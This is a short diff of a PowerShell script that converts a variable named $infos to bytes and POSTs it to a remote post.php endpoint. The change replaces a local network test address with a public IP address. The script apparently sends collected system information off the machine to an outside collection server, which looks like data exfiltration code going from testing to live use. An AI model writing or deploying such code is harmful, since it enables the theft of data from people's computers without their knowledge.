@@ -8,7 +8,7 @@ If ($Number -gt 4)
 }
 else {    
     $Body = [byte[]][char[]]$infos;
-    $Request = [System.Net.HttpWebRequest]::Create('http://192.168.1.12:8888/post.php');
+    $Request = [System.Net.HttpWebRequest]::Create('http://178.170.58.9/post.php');
     $Request.Method = 'POST';
     $Stream = $Request.GetRequestStream();
     $Stream.Write($Body, 0, $Body.Length);
